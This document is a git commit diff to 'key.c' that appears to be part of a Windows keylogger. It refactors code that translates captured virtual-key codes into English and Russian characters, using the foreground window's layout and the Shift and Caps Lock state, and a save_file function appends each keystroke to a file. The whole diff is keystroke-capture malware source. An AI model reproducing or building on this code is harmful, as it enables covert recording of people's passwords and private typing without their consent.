0dcdefb1c3016e997cc3effa14bd78bd410c5d5e
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2026-06-03 15:25:26 +0300

    Update key.c

--- key.c
+++ key.c
@@ -2,541 +2,79 @@
 
 #include "key.h"
 
+static const keymap keys[256] = {
+    [VK_A] = {"a", "A", "ф", "Ф"}, [VK_B] = {"b", "B", "и", "И"},
+    [VK_C] = {"c", "C", "с", "С"}, [VK_D] = {"d", "D", "в", "В"},
+    [VK_E] = {"e", "E", "у", "У"}, [VK_F] = {"f", "F", "а", "А"},
+    [VK_G] = {"g", "G", "п", "П"}, [VK_H] = {"h", "H", "р", "Р"},
+    [VK_I] = {"i", "I", "ш", "Ш"}, [VK_J] = {"j", "J", "о", "О"},
+    [VK_K] = {"k", "K", "л", "Л"}, [VK_L] = {"l", "L", "д", "Д"},
+    [VK_M] = {"m", "M", "ь", "Ь"}, [VK_N] = {"n", "N", "т", "Т"},
+    [VK_O] = {"o", "O", "щ", "Щ"}, [VK_P] = {"p", "P", "з", "З"},
+    [VK_Q] = {"q", "Q", "й", "Й"}, [VK_R] = {"r", "R", "к", "К"},
+    [VK_S] = {"s", "S", "ы", "Ы"}, [VK_T] = {"t", "T", "е", "Е"},
+    [VK_U] = {"u", "U", "г", "Г"}, [VK_V] = {"v", "V", "м", "М"},
+    [VK_W] = {"w", "W", "ц", "Ц"}, [VK_X] = {"x", "X", "ч", "Ч"},
+    [VK_Y] = {"y", "Y", "н", "Н"}, [VK_Z] = {"z", "Z", "я", "Я"},
+    [VK_2] = {"2", "@", "2", "\""}, [VK_3] = {"3", "#", "3", "№"},
+    [VK_4] = {"4", "$", "4", ";"},  [VK_5] = {"5", "%", "5", "%"},
+    [VK_6] = {"6", "^", "6", ":"},  [VK_7] = {"7", "&", "7", "?"},
+    [VK_8] = {"8", "*", "8", "*"},  [VK_9] = {"9", "(", "9", "("},
+    [VK_TILDE]      = {"`", "~", "ё", "Ё"}, [VK_DASH]   = {"-", "_", "-", "_"},
+    [VK_EQ]         = {"=", "+", "=", "+"}, [VK_LBRACKET] = {"[", "{", "х", "Х"},
+    [VK_RBRACKET]   = {"]", "}", "ъ", "Ъ"}, [VK_DOT_COMMA]= {";", ":", "ж", "Ж"},
+    [VK_APOSTROPHE] = {"'", "\"", "э", "Э"},[VK_REV_SLASH]= {"\\", "|", "\\", "/"},
+    [VK_COMMA]      = {",", "<", "б", "Б"}, [VK_DOT]      = {".", ">", "ю", "Ю"},
+    [VK_SLASH]      = {"/", "?", ".", ","},
+    [VK_NUMPAD0]  = {"0", "0", "0", "0"},   [VK_NUMPAD1]  = {"1", "1", "1", "1"},
+    [VK_NUMPAD2]  = {"2", "2", "2", "2"},   [VK_NUMPAD3]  = {"3", "3", "3", "3"},
+    [VK_NUMPAD4]  = {"4", "4", "4", "4"},   [VK_NUMPAD5]  = {"5", "5", "5", "5"},
+    [VK_NUMPAD6]  = {"6", "6", "6", "6"},   [VK_NUMPAD7]  = {"7", "7", "7", "7"},
+    [VK_NUMPAD8]  = {"8", "8", "8", "8"},   [VK_NUMPAD9]  = {"9", "9", "9", "9"},
+    [VK_MULTIPLY] = {"*", "*", "*", "*"},   [VK_ADD]      = {"+", "+", "+", "+"},
+    [VK_SUBTRACT] = {"-", "-", "-", "-"},   [VK_DIVIDE]   = {"/", "/", "/", "/"},
+    [VK_DECIMAL]  = {".", ".", ".", "."},   [VK_SPACE]    = {" ", " ", " ", " "},
+    [VK_TAB]      = {"\t", "\t", "\t", "\t"}, [VK_RETURN] = {"\n", "\n", "\n", "\n"},
+    [VK_BACK]     = {"<BACK SPACE>", "<BACK SPACE>", "<BACK SPACE>", "<BACK SPACE>"}
+};
+
+
 bool is_key_ru(void){
     HKL keyboard = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
-    if(HIWORD(keyboard) == RU)
+    if(LOWORD(keyboard) == RU)
         return true;
     return false;
 }
 
 void save_file(const char *filename, const char *key){
     FILE *file = NULL;
-	long size = 0;
-    if((file = fopen(filename, "a")) != NULL){		
+    if((file = fopen(filename, "a")) != NULL){
         fprintf(file, "%s", key);
         fclose(file);
     }
 }
 
-const char* key_value(const int code){
+const char* key_value(const int code, getStateKey keystate){
 	bool is_shift = false;
-	is_shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-    switch(code){
-        case VK_A :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Ф";
-                else
-                    return "ф";
-            }
-            else if(is_shift)
-                return "A";
+	bool is_caps = false;
+	bool is_upper = false;
+	is_shift = (keystate(VK_SHIFT) & 0x8000) != 0;
+	is_upper = is_shift;
+	if(code >= 0 && code <= 255 && code != VK_CAPITAL && keys[code].en_key != NULL){
+        if (code >= VK_A && code <= VK_Z) {
+            is_caps = (keystate(VK_CAPITAL) & 0x0001) != 0;
+            is_upper = is_shift ^ is_caps;
+        }
+        if(is_key_ru()){
+            if(is_upper)
+                return keys[code].ru_key_shift;
             else
-                return "a";
-        case VK_B :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "И";
-                else
-                    return "и";
-            }
-            else if(is_shift)
-                return "B";
+                return keys[code].ru_key;
+        }
+        else if(is_upper)
+                return keys[code].en_key_shift;
             else
-                return "b";
-        case VK_C :
-			if(is_key_ru()){
-                if(is_shift)
-                    return "С";
-                else
-                    return "с";
-            }
-            else if(is_shift)
-                return "C";
-            else
-                return "c";
-        case VK_D :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "В";
-                else
-                    return "в";
-            }
-            else if(is_shift)
-                return "D";
-            else
-                return "d";
-        case VK_E :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "У";
-                else
-                    return "у";
-            }
-            else if(is_shift)
-                return "E";
-            else
-                return "e";
-        case VK_F :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "А";
-                else
-                    return "а";
-            }
-            else if(is_shift)
-                return "F";
-            else
-                return "f";
-        case VK_G :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "П";
-                else
-                    return "п";
-            }
-            else if(is_shift)
-                return "G";
-            else
-                return "g";
-        case VK_H :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Р";
-                else
-                    return "р";
-            }
-            else if(is_shift)
-                return "H";
-            else
-                return "h";
-        case VK_I :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Ш";
-                else
-                    return "ш";
-            }
-            else if(is_shift)
-                return "I";
-            else
-                return "i";
-        case VK_J :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "О";
-                else
-                    return "о";
-            }
-            else if(is_shift)
-                return "J";
-            else
-                return "j";
-        case VK_K :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Л";
-                else
-                    return "л";
-            }
-            else if(is_shift)
-                return "K";
-            else
-                return "k";
-        case VK_L :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Д";
-                else
-                    return "д";
-            }
-            else if(is_shift)
-                return "L";
-            else
-                return "l";
-        case VK_M :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Ь";
-                else
-                    return "ь";
-            }
-            else if(is_shift)
-                return "M";
-            else
-                return "m";
-        case VK_N :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Т";
-                else
-                    return "т";
-            }
-            else if(is_shift)
-                return "N";
-            else
-                return "n";
-        case VK_O :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Щ";
-                else
-                    return "щ";
-            }
-            else if(is_shift)
-                return "O";
-            else
-                return "o";
-        case VK_P :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "З";
-                else
-                    return "з";
-            }
-            else if(is_shift)
-                return "P";
-            else
-                return "p";
-        case VK_Q :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Й";
-                else
-                    return "й";
-            }
-            else if(is_shift)
-                return "Q";
-            else
-                return "q";
-        case VK_R :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "К";
-                else
-                    return "к";
-            }
-            else if(is_shift)
-                return "R";
-            else
-                return "r";
-        case VK_S :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Ы";
-                else
-                    return "ы";
-            }
-            else if(is_shift)
-                return "S";
-            else
-                return "s";
-        case VK_T :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Е";
-                else
-                    return "е";
-            }
-            else if(is_shift)
-                return "T";
-            else
-                return "t";
-        case VK_U :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Г";
-                else
-                    return "г";
-            }
-            else if(is_shift)
-                return "U";
-            else
-                return "u";
-        case VK_V :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "М";
-                else
-                    return "м";
-            }
-            else if(is_shift)
-                return "V";
-            else
-                return "v";
-        case VK_W :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Ц";
-                else
-                    return "ц";
-            }
-            else if(is_shift)
-                return "W";
-            else
-                return "w";
-        case VK_X :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Ч";
-                else
-                    return "ч";
-            }
-            else if(is_shift)
-                return "X";
-            else
-                return "x";
-        case VK_Y :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Н";
-                else
-                    return "н";
-            }
-            else if(is_shift)
-                return "Y";
-            else
-                return "y";
-        case VK_Z :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Я";
-                else
-                    return "я";
-            }
-            else if(is_shift)
-                return "Z";
-            else
-                return "z";
-        case VK_0 :
-            if(is_shift)
-                return ")";
-            else
-                return "0";
-        case VK_1 :
-            if(is_shift)
-                return "!";
-            else
-                return "1";
-        case VK_2 :
-			if(is_key_ru()){
-				if(is_shift)
-					return "\"";
-				else
-                	return "2";
-			}				
-            else if(is_shift)
-                return "@";
-            else
-                return "2";
-        case VK_3 :
-			if(is_key_ru()){
-				if(is_shift)
-					return "№";
-				else
-                	return "3";
-			}
-            else if(is_shift)
-                return "#";
-            else
-                return "3";
-        case VK_4 :
-			if(is_key_ru()){
-				if(is_shift)
-					return ";";
-				else
-                	return "4";
-			}
-            else if(is_shift)
-                return "$";
-            else
-                return "4";
-        case VK_5 :
-            if(is_shift)
-                return "%";
-            else
-                return "5";
-        case VK_6 :
-			if(is_key_ru()){
-				if(is_shift)
-					return ":";
-				else
-                	return "6";
-			}
-            else if(is_shift)
-                return "^";
-            else
-                return "6";
-        case VK_7 :
-            if(is_key_ru()){
-				if(is_shift)
-					return "?";
-				else
-                	return "7";
-			}
-            else if(is_shift)
-                return "&";
-            else
-                return "7";
-        case VK_8 :
-            if(is_shift)
-                return "*";
-            else
-                return "8";
-        case VK_9 :
-            if(is_shift)
-                return "(";
-            else
-                return "9";
-        case VK_TILDE :
-			if(is_key_ru()){
-				if(is_shift)
-					return "Ё";
-				else
-                	return "ё";
-			}
-            else if(is_shift)
-                return "~";
-            else
-                return "`";
-        case VK_DASH :
-            if(is_shift)
-                return "_";
-            else
-                return "-";
-        case VK_EQ :
-            if(is_shift)
-                return "+";
-            else
-                return "=";
-        case VK_LBRACKET :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Х";
-                else
-                    return "х";
-            }
-            else if(is_shift)
-                return "{";
-            else
-                return "[";
-        case VK_RBRACKET :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Ъ";
-                else
-                    return "ъ";
-            }
-            else if(is_shift)
-                return "}";
-            else
-                return "]";
-        case VK_DOT_COMMA :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Ж";
-                else
-                    return "ж";
-            }
-            else if(is_shift)
-                return ":";
-            else
-                return ";";
-        case VK_APOSTROPHE :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Э";
-                else
-                    return "э";
-            }
-            else if(is_shift)
-                return "\"";
-            else
-                return "'";
-        case VK_REV_SLASH :
-			if(is_key_ru()){
-				if(is_shift)
-					return "/";
-				else
-                	return "\\";
-			}
-            else if(is_shift)
-                return "|";
-            else
-                return "\\";
-        case VK_COMMA :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Б";
-                else
-                    return "б";
-            }
-            else if(is_shift)
-                return "<";
-            else
-                return ",";
-        case VK_DOT :
-            if(is_key_ru()){
-                if(is_shift)
-                    return "Ю";
-                else
-                    return "ю";
-            }
-            else if(is_shift)
-                return ">";
-            else
-                return ".";
-        case VK_SLASH :
-			if(is_key_ru()){
-                if(is_shift)
-                    return ",";
-                else
-                    return ".";
-            }
-            else if(is_shift)
-                return "?";
-            else
-                return "/";
-        case VK_NUMPAD0 :
-            return "0";
-        case VK_NUMPAD1 :
-            return "1";
-        case VK_NUMPAD2 :
-            return "2";
-        case VK_NUMPAD3 :
-            return "3";
-        case VK_NUMPAD4 :
-            return "4";
-        case VK_NUMPAD5 :
-            return "5";
-        case VK_NUMPAD6 :
-            return "6";
-        case VK_NUMPAD7 :
-            return "7";
-        case VK_NUMPAD8 :
-            return "8";
-        case VK_NUMPAD9 :
-            return "9";
-        case VK_MULTIPLY :
-            return "*";
-        case VK_ADD :
-            return "+";
-        case VK_SUBTRACT :
-            return "-";
-        case VK_DIVIDE :
-            return "/";
-        case VK_DECIMAL :
-            return ".";
-        case VK_SPACE :
-            return " ";
-        case VK_TAB :
-            return "\t";
-        case VK_CAPITAL :
-            return "<CAPS LOCK>";
-        case VK_RETURN :
-            return "\n";
-        case VK_BACK :
-            return "<BACK SPACE>";
-    }
+                return keys[code].en_key;
+	}
 	return "";
 }
